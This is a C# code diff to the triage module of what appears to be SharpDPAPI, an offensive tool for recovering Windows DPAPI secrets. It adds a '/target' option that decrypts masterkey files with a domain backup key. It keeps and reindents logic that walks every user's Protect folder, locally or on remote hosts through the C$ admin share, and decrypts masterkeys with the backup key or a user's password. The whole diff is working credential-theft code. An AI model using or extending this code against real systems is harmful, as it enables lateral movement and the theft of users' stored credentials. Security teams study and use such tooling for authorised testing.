@@ -10,98 +10,160 @@ namespace SharpDPAPI
 {
     public class Triage
     {
-        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", string password = "")
+        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", string password = "", string target = "")
         {
             // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied
 
             var mappings = new Dictionary<string, string>();
             var canAccess = false;
 
-            if (!String.IsNullOrEmpty(computerName))
+            if (!String.IsNullOrEmpty(target))
             {
-                canAccess = Helpers.TestRemote(computerName);
-                if (!canAccess)
+                // if we're targeting specific masterkey files
+
+                if (backupKeyBytes.Length == 0)
                 {
-                    return new Dictionary<string, string>();
+                    // currently only backupkey is supported
+                    Console.WriteLine("[X] The masterkey '/target:X' option currently requires '/pvk:BASE64...'");
+                    return mappings;
                 }
-            }
 
-            string[] userDirs;
-
-            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && canAccess))
-            {
-                // if elevated, triage ALL reachable masterkeys
-
-                var userFolder = !String.IsNullOrEmpty(computerName) ?
-                    $"\\\\{computerName}\\C$\\Users\\" : 
-                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
-
-                userDirs = Directory.GetDirectories(userFolder);
-            }
-            else
-            {
-                // otherwise we're only triaging the current user's path
-                userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
-            }
-
-            foreach (var dir in userDirs)
-            {
-                if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
-                    continue;
-
-                var userDPAPIBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
-                if (!Directory.Exists(userDPAPIBasePath))
-                    continue;
-
-                var directories = Directory.GetDirectories(userDPAPIBasePath);
-                foreach (var directory in directories)
+                if (!File.Exists(target) && !Directory.Exists(target))
                 {
-                    var files = Directory.GetFiles(directory);
-                    var isDomain = false;
-                    byte[] hmacBytes = null;
+                    Console.WriteLine($"[X] The target '{target}' doesn't exist!");
+                    return mappings;
+                }
+
+                KeyValuePair<string, string> plaintextMasterKey;
+
+                if ((File.GetAttributes(target) & FileAttributes.Directory) == FileAttributes.Directory)
+                {
+                    // if we're triaging a folder of masterkeys
+                    var files = Directory.GetFiles(target);
 
                     foreach (var file in files)
                     {
-                        // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
-                        if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
-                        {
-                            isDomain = true; // means use the NTLM of the user password instead of the SHA1
-                        }
-                    }
-
-                    if (!String.IsNullOrEmpty(password))
-                    {
-                        hmacBytes = Dpapi.CalculateKeys(password, directory, isDomain);
-                    }
-
-                    foreach (var file in files)
-                    {
-                        if (!Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")) 
-                            continue;
-
-                        if (show)
-                        {
-                            Console.WriteLine("[*] Found MasterKey : {0}", file);
-                        }
-
-                        var masterKeyBytes = File.ReadAllBytes(file);
                         try
                         {
-                            KeyValuePair<string, string> plaintextMasterKey;
-                            if (!String.IsNullOrEmpty(password))
+                            FileInfo f = new FileInfo(file);
+                            
+                            if (Helpers.IsGuid(f.Name))
                             {
-                                plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
-                            }
-                            else
-                            {
+                                var masterKeyBytes = File.ReadAllBytes(file);
                                 plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
+                                mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                             }
-
-                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                         }
                         catch (Exception e)
                         {
-                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                            Console.WriteLine("[X] Error triaging masterkey target '{0}' : {1}", target, e.Message);
+                        }
+                    }
+                }
+                else
+                {
+                    // otherwise we're triaging one file
+                    try
+                    {
+                        var masterKeyBytes = File.ReadAllBytes(target);
+                        plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
+                        mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[X] Error triaging masterkey target '{0}' : {1}", target, e.Message);
+                    }
+                }
+            }
+
+            else
+            {
+                if (!String.IsNullOrEmpty(computerName))
+                {
+                    canAccess = Helpers.TestRemote(computerName);
+                    if (!canAccess)
+                    {
+                        return new Dictionary<string, string>();
+                    }
+                }
+
+                string[] userDirs;
+
+                if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && canAccess))
+                {
+                    // if elevated, triage ALL reachable masterkeys
+
+                    var userFolder = !String.IsNullOrEmpty(computerName) ?
+                        $"\\\\{computerName}\\C$\\Users\\" :
+                        $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
+
+                    userDirs = Directory.GetDirectories(userFolder);
+                }
+                else
+                {
+                    // otherwise we're only triaging the current user's path
+                    userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
+                }
+
+                foreach (var dir in userDirs)
+                {
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
+                        continue;
+
+                    var userDPAPIBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
+                    if (!Directory.Exists(userDPAPIBasePath))
+                        continue;
+
+                    var directories = Directory.GetDirectories(userDPAPIBasePath);
+                    foreach (var directory in directories)
+                    {
+                        var files = Directory.GetFiles(directory);
+                        var isDomain = false;
+                        byte[] hmacBytes = null;
+
+                        foreach (var file in files)
+                        {
+                            // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
+                            if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
+                            {
+                                isDomain = true; // means use the NTLM of the user password instead of the SHA1
+                            }
+                        }
+
+                        if (!String.IsNullOrEmpty(password))
+                        {
+                            hmacBytes = Dpapi.CalculateKeys(password, directory, isDomain);
+                        }
+
+                        foreach (var file in files)
+                        {
+                            if (!Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                                continue;
+
+                            if (show)
+                            {
+                                Console.WriteLine("[*] Found MasterKey : {0}", file);
+                            }
+
+                            var masterKeyBytes = File.ReadAllBytes(file);
+                            try
+                            {
+                                KeyValuePair<string, string> plaintextMasterKey;
+                                if (!String.IsNullOrEmpty(password))
+                                {
+                                    plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
+                                }
+                                else
+                                {
+                                    plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
+                                }
+
+                                mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                            }
                         }
                     }
                 }
@@ -532,11 +594,6 @@ namespace SharpDPAPI
                     Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
                 }
                 Console.WriteLine();
-                foreach (var key in certDictionary.Keys)
-                {
-                    Console.WriteLine("{0}", certDictionary[key]);
-                    Console.WriteLine();
-                }
             }
             catch (Exception e)
             {
